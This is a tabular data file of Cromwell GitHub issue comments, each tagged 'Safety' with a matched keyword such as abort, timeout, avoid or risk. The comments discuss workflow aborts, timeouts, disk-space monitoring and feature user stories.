Safety,"@nickp60 not specifically related to cromwell, but in WDL in general, entrypoints generally should be avoided. Any behaviour you need the task to do should be coded in the task itself. . So if you need `auth.sh` to be run, then in your wdl task you should do:. ```wdl; task a {. command <<<; ./auth.sh; .... other commands here ....; >>>; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5901#issuecomment-702846067:102,avoid,avoided,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5901#issuecomment-702846067,1,['avoid'],['avoided']
Safety,@patmagee It turned out it was a different issue entirely in our production environment that had the symptoms of abort failures. We've not had success recreating this -- but let us know what you end up observing!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-400468311:113,abort,abort,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-400468311,1,['abort'],['abort']
Safety,@pgrosu IIRC we use `central` to avoid some of their other large customers in other zones. However note that we *are* one of their large customers so choosing the same zone as us might not be the best plan for success in avoiding preemptions :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836:33,avoid,avoid,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836,2,['avoid'],"['avoid', 'avoiding']"
Safety,"@pgrosu It's in our internal space, however I can give you the gist. We're doing a few things at once ...; - Make workflow submission async. Submitted workflows go into a new store and the WorkflowManagerActor can pull them as necessary. Within the store they'll be marked as either Submitted, Running or Restartable. The latter is a state which is assigned to any workflow in Running state when the system comes online; - The EngineJobExecutionActor (EJEA above) sits between the WorkflowExecutionActor and the BackendJobExecutionActor, and will manage engine-side knowledge in a persisted store. The combination of this and the above will allow us to bring back what we call the 'restart' functionality - i.e. pick up a running workflow from the engine side but not reattach to running backend jobs; - Less hashed out at the moment, if a backend will support 'recover' functionality (attaching to the backend jobs, we'll implement this in as many of our own backends as we can), the backend will need to manage its own information, e.g. using the KV store",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714:862,recover,recover,862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714,1,['recover'],['recover']
Safety,"@ruchim @Horneth @aednichols I'm seeing this error pop up running cromwell-35 on SGE, except the timeout is at 60 seconds rather than 10. The error gets repeated a number of times (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:97,timeout,timeout,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['timeout'],['timeout']
Safety,"@ruchim Did ""abort by label"" functionality go into your work on Cromwell 28? If not that's fine, just wanted to check if I should close this or reprioritize.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2333#issuecomment-313467275:13,abort,abort,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2333#issuecomment-313467275,1,['abort'],['abort']
Safety,"@ruchim I'm not sure about the details, we have a monitor script (https://github.com/HumanCellAtlas/pipeline-tools/blob/c6c11a20c91aa360fcd7ca7c28de14b281cabd7b/adapter_pipelines/ss2_single_sample/options.json#L2) running as workflow options besides the actual RSEM tool, which is monitoring the disk space. it outputs:; ```; /cromwell_root/monitoring.sh: line 15: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 17: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 19: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 13: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 15: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 17: echo: write error: No space left on device; ``` ; but not exit codes. Do you think it's possible to add some error handling to that bash script to let cromwell know the out of space error during the runtime? Even if it's practical to do that, it may still not as safe as the exit code throw by the actual tool. so wait for @jishuxu's response.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417695517:1043,safe,safe,1043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417695517,1,['safe'],['safe']
Safety,"@ruchim Yes! We eventually switched our particular workflow that motivated this issue to avoid a glob altogether. We really do expect at most one matching file, so this was simpler than pulling it out of an array later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4004#issuecomment-417386515:89,avoid,avoid,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4004#issuecomment-417386515,2,['avoid'],['avoid']
Safety,@scottfrazer @Horneth Would you all feel safer if this was left until after s/g is merged in before merging being merged?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-136401514:41,safe,safer,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-136401514,1,['safe'],['safer']
Safety,"@scottfrazer So the reason I'm asking about the required functionality and JES (and asked if the main issue was the eventual annoying rebase if this isn't merged) is that my concern is that this is a hefty change mid-sprint when we're already concerned w/ the hairiness of our actual sprint goals. For instance what if this causes some unforeseen issue which causes the s/g to not be complete this sprint. We can handwave all we want about what is truly important or not but the only official metric of importance is what's in our sprint and if this disrupts that's no bueno - and regardless of our confidence level there _is_ a risk here. I suppose we could back it out but that'd still likely end up having been a big time disruption at that point. I would feel a lot more comfortable if a large body of WDL was run against JES backend (and Local too, really - though that's less worrisome) - it'd have been nice if someone decided the integration test battery was important enough to work on the side ;) If people have actually been listening to my requests to paste their interesting WDLs on that ticket that'd be a good start, but double check with @cjllanwarne as he wrote a WDL to exercise all the various functionality we supported at the time. . Actually what'd be really awesome is if you could run the WDL they're using for the demo as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661:629,risk,risk,629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661,1,['risk'],['risk']
Safety,"@scottfrazer is currently rebasing on top of @cjllanwarne's abort merge, if you merge now he'll need to rebase again on top of this. Maybe we can wait to get the factory mergable/merged to rebase this one ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216323662:60,abort,abort,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216323662,1,['abort'],['abort']
Safety,"@seandavi Gotcha, this might be another case of ""frightening log message"" if you were detecting it via cromwell, although IIRC we squelched those specifically as they were too spammy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342:86,detect,detecting,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342,1,['detect'],['detecting']
Safety,@seandavi Thanks. One could say though that we're not adhering to one of the tenets of distributed computing which is to make sure everything you do has some reasonable timeout where you give up and assume its dead :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260527835:169,timeout,timeout,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260527835,1,['timeout'],['timeout']
Safety,@seandavi are you still interested in being able to limit CPU and memory when running on local? ; @geoffjentry what would be the effort and risk for adding these parameters?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117:140,risk,risk,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117,1,['risk'],['risk']
Safety,"@vsoch if you've not already done that, we can always reopen this PR. You all are right, I'm wrong. The reason why I was leaning towards avoiding `cromwell.examples.conf` blurbs is that (as @TMiguelT points out) it's a bit of a mess right now due to having too much stuff in there. TBH work needs to be done to start making that more organized. I sometimes can lean towards throwing the baby out with the bathwater in circumstances like that. I think it's fine to put a number of configurations into `cromwell.examples.conf` as long as the full block is fairly well self contained, and well documented. IOW something which would be easy to peel out into a separate file if/when we get there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389:137,avoid,avoiding,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389,1,['avoid'],['avoiding']
Safety,@xuf12 thank you for your contribution and for your interest in Cromwell. We merged our changeset in PR https://github.com/broadinstitute/cromwell/pull/5567 so I'm going to go ahead and close this one since it is now redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5564#issuecomment-656253905:217,redund,redundant,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5564#issuecomment-656253905,1,['redund'],['redundant']
Safety,"@yfarjoun -- can you give a little more context on this? These jobs will just fail upon localization right? or does something else happen that you want to avoid?. Completing this sentence ""this is important because ..."" would be a good formula!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231626677:155,avoid,avoid,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231626677,1,['avoid'],['avoid']
Safety,"A better design (which maybe requires a JES ask) is to have JES report back _exactly_ what was uploaded. Then there will be no uncertainty, no timeouts and no issues with eventual consistency being to eventual.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1395#issuecomment-256933084:143,timeout,timeouts,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1395#issuecomment-256933084,1,['timeout'],['timeouts']
Safety,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:151,safe,safety-threshold,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650,1,['safe'],['safety-threshold']
Safety,A new centaur test has been added based on an existing one (`cwl_prefix_for_array`) that was from a previous example CWL of mine 😄 . Looks like whatever was causing that timeout didn't recur this go around.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334:170,timeout,timeout,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334,1,['timeout'],['timeout']
Safety,A quick conflict resolve in IntellIJ took care of things very nicely. A sanity check is that the parser on this branch contains references to both `$call_brace_block` and `(?<!\\\\)`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479662249:72,sanity check,sanity check,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479662249,1,['sanity check'],['sanity check']
Safety,"A user is reporting the failure message ""the job was aborted from outside Cromwell"". Looking at the Operation details:; ```; ""error"": {; ""code"": 1,; ""details"": [],; ""message"": ""Operation canceled at 2018-08-08T21:05:00-07:00 because it is older than 6 days""; },; ```. Can Cromwell inspect the Operation for this condition and produce a friendlier error message?. Operation `operations/EK3uv-_PLBjok8Wbqs77lCUgq92AiSQqD3Byb2R1Y3Rpb25RdWV1ZQ`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-412133698:53,abort,aborted,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496#issuecomment-412133698,1,['abort'],['aborted']
Safety,A very quick peek in the Rawls db for workflows still in Aborting gives me 92. The earliest one is from February so I'd _guess_ this is still a problem.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327941555:57,Abort,Aborting,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-327941555,1,['Abort'],['Aborting']
Safety,AC: Investigate the root cause of why the abort endpoint occasionally returns a 404 in production.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-475637417:42,abort,abort,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-475637417,1,['abort'],['abort']
Safety,"Abort is broken, it is true. Closing this issue in favor of tracking all the Abort-related work in the [Google Doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1396#issuecomment-324467643:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1396#issuecomment-324467643,2,['Abort'],"['Abort', 'Abort-related']"
Safety,Abort is definitely not idempotent; I don't think it would be appropriate to make this a GET.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-305813608:0,Abort,Abort,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318#issuecomment-305813608,1,['Abort'],['Abort']
Safety,"Actually... @aednichols has some ""run a single workflow mode"" tests - it might be nice to add this situation to those so we can avoid any regressions here. Does that sounds feasible to you Adam (or is it a much bigger change)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698:128,avoid,avoid,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5236#issuecomment-543828698,1,['avoid'],['avoid']
Safety,"Addendum...; ``Ctl-\``. I see a lot of the following, but not much else that stands out.; ```; ""pool-1-thread-11"" #77 prio=5 os_prio=0 tid=0x00007fe0fc083800 nid=0x6ea8 waiting on condition [0x00007fe1ae391000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b793b68> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject). ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582:267,Unsafe,Unsafe,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265754582,1,['Unsafe'],['Unsafe']
Safety,"Adding this to the [Runtime Attributes improvement spec](https://docs.google.com/document/d/1EcsPrmZ6hKtz9vumhdT3357e1jdhljvs6eXXeT6HTaM/edit#). As a **workflow runner on SGE**, I want **be able to make the Docker attribute to be optional**, so that I can **avoid rewriting my WDL when I don't use Docker**.; - Effort: **@geoffjentry What do you think?**; - Risk: **Small?**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-329591802:258,avoid,avoid,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-329591802,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"Ah, I see now how you intent for it to work. I don't think this will be very practical on any kind of shared SGE HPC without a seperate poll rate. . As mentioned elsewhere; the call rate of the `pollStatus` is geared towards a low-impact filesytem check and not a high-impact call to the SGE queque master (i.e. `check-alive` uses `qstat`). Enabling the `exit-code-timeout` with a somewhat large numbers of tasks will quickly cripple any average SGE HPC. . If you enable this and are an HPC admin; make sure to keep taps on your submission services.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425025492:365,timeout,timeout,365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-425025492,1,['timeout'],['timeout']
Safety,"Also seen: . ```; Execution failed: pulling image: docker pull: generic::unknown: retry budget exhausted (10 attempts): running [""docker"" ""pull"" ""quay.io/bcbio/bcbio-vc@sha256:90087824e545df6d3996a28360f2f0fd28dce611a989bbcc79aa8117d341f6ef""]: exit status 1 (standard error: ""Error response from daemon: Get https://quay.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n""); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4438#issuecomment-443429790:393,Timeout,Timeout,393,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4438#issuecomment-443429790,1,['Timeout'],['Timeout']
Safety,"Also, note that Google PD's can be expanded on the fly in seconds, even while the VM is still running under load. I've done this manually on non-FC VMs via the script below. Using this approach combined with a disk space monitoring process (and a size cap!) would allow the job to pass the first time, avoiding a retry. And... if it was also during the algorithm, not just data download, this could eradicate both disk space errors and disk over-provisioning. . https://github.com/broadinstitute/firecloud_developer_toolkit/blob/master/gce/expand_disk.sh. Unfortunately I don't know of a way to hot-swap RAM into the VM.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902:302,avoid,avoiding,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-325727902,1,['avoid'],['avoiding']
Safety,And I can't seem to abort the workflow.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-343273348:20,abort,abort,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-343273348,1,['abort'],['abort']
Safety,"Another issue for the [Log spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). As a **user on the CLI and single workflow mode**, I want **to easily see the output location**, so that I can **check the status of my jobs while they are still completing**.; - Effort: **TBD** @geoffjentry ; - Risk: **TBD** @geoffjentry ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495:333,Risk,Risk,333,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-325478495,1,['Risk'],['Risk']
Safety,Another recent example of some strange aborting behavior: http://gatkforums.broadinstitute.org/gatk/discussion/comment/40215,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-314539221:39,abort,aborting,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414#issuecomment-314539221,1,['abort'],['aborting']
Safety,"As a **Cromwell dev** I want **to have uniquely named Metadata services**, so that **when there are multiple services I can specify which metadata service**.; - Effort: Small; - Risk: Would this break WDLs? APIs?; - Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2440#issuecomment-336169425:178,Risk,Risk,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2440#issuecomment-336169425,1,['Risk'],['Risk']
Safety,"As a **Cromwell dev**, I want **Cromwell to follow akka protocols of handling unexpected messages**, so that I can **avoid excessive LinesOfCode**.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328963748:117,avoid,avoid,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1808#issuecomment-328963748,1,['avoid'],['avoid']
Safety,"As a **Cromwell dev**, I want **the wdl4s-CWL subproject to compile quickly**, so that **I don't waste my time waiting and waiting**.; - Effort: small? ; - As @danbills mentioned, maybe putting Circe encoding into another project will save time.; - Risk: small; - Business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2712#issuecomment-345032450:249,Risk,Risk,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2712#issuecomment-345032450,1,['Risk'],['Risk']
Safety,"As a **Cromwell dev**, I want **to be able to release Cromwell with the same Github account**, so that **I don't have to use my personal github token.**. - effort: small; - risk: small; - business value: small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-344712648:173,risk,risk,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2402#issuecomment-344712648,1,['risk'],['risk']
Safety,"As a **Cromwell dev**, I want **to explore the cost/benefits of using AsyncAppender for our logs**, so that **we can decide whether we should adopt it.**; - effort: Small spike; - risk: Small to Medium; - business value: Small to Medium, depending on the results of the spike",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-344952812:180,risk,risk,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-344952812,1,['risk'],['risk']
Safety,"As a **Cromwell dev**, I want **wdltool to be released automatically**, so that **when I release Cromwell, wdltool is released and up to date**.; - Effort: Small?; - Risk: Small; - Business Value: Small?; - @Horneth how much time/effort does it take to manually release wdltool? how much risk of human error is there?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2400#issuecomment-335884089:166,Risk,Risk,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2400#issuecomment-335884089,2,"['Risk', 'risk']","['Risk', 'risk']"
Safety,"As a **Cromwell developer**, I want **each unit test to appear once**, so that I can **avoid duplicate (and messy) tests**.; - Effort: **TBD**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-328204130:87,avoid,avoid,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1581#issuecomment-328204130,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **Redteam member**, I want **to improve the Cromwell release process**, so that **it gets easier every time we release**.; * Effort: depends on the issue; * Risk: Small, depends on the issue; * Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2404#issuecomment-332631666:162,Risk,Risk,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2404#issuecomment-332631666,1,['Risk'],['Risk']
Safety,"As a **WDL runner**, I want **to include a directory with index file(s) with my inputs**, so that I can **avoid doing it manually**.; - Effort: **? ** @geoffjentry ; - Risk: ** ? ** @geoffjentry ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1412#issuecomment-327924055:106,avoid,avoid,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1412#issuecomment-327924055,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **WDL user**, I want **declare a parameter once for many tasks**, so that I **don't have to alias the parameter for each aliased task**.; - Effort: **Small-Medium**; - Risk: **Small**; - Business value: **Small**; @vdauwera please chime in if you disagree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1335#issuecomment-325452489:173,Risk,Risk,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1335#issuecomment-325452489,1,['Risk'],['Risk']
Safety,"As a **developer using Cromwell**, I want **to run workflows from the CLI that connect directly to the Cromwell REST APIs**, so that I can **easily interact with the APIs (does that sound right? @geoffjentry @Horneth )**.; - Effort: **?**; - Risk: **?**; - Business value: **?**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-328205809:242,Risk,Risk,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1492#issuecomment-328205809,1,['Risk'],['Risk']
Safety,"As a **production pipeline runner**, I want **to write all output files in one directory (rather than hierarchical)**, so that I can **(@ktibbett why is this helpful?)**.; - Effort: **Small**; - Risk: **Medium**; - if files have the same name they could be overwritten; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-326068415:195,Risk,Risk,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-326068415,1,['Risk'],['Risk']
Safety,"As a **super-user**, I want **to see every call Cromwell made to Google**, so that I can **debug what is wrong with Cromwell**.; - Effort: **Small**; - Risk: **Medium**; - - Need to make sure regular users don't see these logs, so that these are not visible by default.; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-325462508:152,Risk,Risk,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-325462508,1,['Risk'],['Risk']
Safety,"As a **user aborting workflows**, I want to **get a 403 status after aborting a workflow**, so that **I know that my workflow is going to abort**.; * Effort: Small; * Decide whether we want to keep the 403 status; * @geoffjentry what does the 403 status gain us or users?; * Risk: Small; * Business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332639761:12,abort,aborting,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332639761,4,"['Risk', 'abort']","['Risk', 'abort', 'aborting']"
Safety,"As a **user accessing CaaS**, I want **to query a Collection of workflows**, so that I can **view the status of many workflows at once and get the results quickly**.; - Effort: **Medium**; - Risk: **Small to Medium**; - Business value: **Medium to Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212:191,Risk,Risk,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2138#issuecomment-330983212,1,['Risk'],['Risk']
Safety,"As a **user developing a backend for Cromwell**, I want **the execution actor naming and system to be simple and concise**, so that I can **more easily work with Cromwell, and don't add unnecessary code**.; - Effort: **Medium**; - Risk: **Small**; - Business value: **Small**; - Not to devalue cleaning up tech debt, but there are higher value items on our docket.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-344404227:231,Risk,Risk,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-344404227,1,['Risk'],['Risk']
Safety,"As a **user looking at logs** I want **the logs to be color-coded**, so that **I can easily debug my workflow and get the info I'm looking for**.; - Effort: Medium; - While the color-coding is easy, deciding what to color-code is more complicated.; - Risk: X-Small; - Business value: Medium; - Logs are a known issue. Maybe color coding them is an easy, first step to improving them",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-336149648:251,Risk,Risk,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2036#issuecomment-336149648,1,['Risk'],['Risk']
